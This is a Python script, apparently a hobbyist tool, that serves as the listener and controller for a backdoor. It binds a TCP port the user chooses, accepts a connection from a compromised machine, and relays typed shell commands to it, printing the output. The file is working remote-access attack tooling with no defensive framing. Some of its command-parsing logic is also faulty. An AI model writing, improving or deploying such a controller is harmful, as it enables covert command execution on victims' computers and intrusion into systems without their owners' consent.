import socket
import threading
from Machineip import gethost as nw
from colorama import init
from time import sleep 
import os
init(autoreset=True)
form = 'utf-8'
server = nw.getLAN()
publicip = nw.getWAN()
print(f'local ip: {server}\npublic ip: {publicip}')
port = input('enter a port to run the backdoor on: ')
port = int(port)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((server, port))
conn = ''
addr = ''
def HandleClient():
	s.listen()
	global conn, addr
	conn, addr = s.accept()


info = ' '
def sysinfo():
	global info
	info = conn.recv(128).decode(form)


length = ' '
def getlen():
	global length
	length = conn.recv(65535).decode(form)
	length = int(len(length))
	print(f'packet size: {length}')


count = 0
cmd1 = ' '

HandleClient()
print('\033[32m'f'session opened with {addr}')
sleep(1)
sysinfo()
while True:
	sleep(0.2)
	cmd = input(f'{info}>')
	cmd = cmd.lstrip(' ')
	whitespaces = cmd.count(' ')
	if whitespaces > 0 and whitespaces < 2:
		try:
			cmd1, cmd2 = cmd.split()
			cmd2 += ' '
		except ValueError:
			cmd += ' '
			pass
		cmd = cmd.lstrip(' ')
		if cmd1 == 'cd':
			sleep(0.1)
			conn.send(cmd1.encode(form))
			sleep(0.1)
			conn.send(cmd2.encode(form))
			sleep(0.1)
			sysinfo()
		elif cmd1 == 'clear':
			os.system('cls')
		elif cmd == '' or ' ' * whitespaces:
			print('no command entered or syntax was incorrect')

		else:
			sleep(0.1)
			conn.send(cmd.encode(form))
			getlen()
			if length < 17:
				print('the command was not executable or there was no reply')
				sleep(0.1)
				sysinfo()
			else:
				reply = conn.recv(length).decode(form)
				print(reply)
				sleep(0.1)
				sysinfo()
	else:
		if cmd == 'clear':
			os.system('cls')

		elif cmd == 'cd' + ' ' * whitespaces:
			pass

		elif cmd == '' or ' ' * whitespaces:
			pass

		else:
			sleep(0.1)
			conn.send(cmd.encode(form))

			getlen()
			if length < 17:
				print('the command was not executable or there was no reply')
				sleep(0.1)
				sysinfo()

			else:
				reply = conn.recv(length).decode(form)
				print(reply)
				sleep(0.1)
				sysinfo()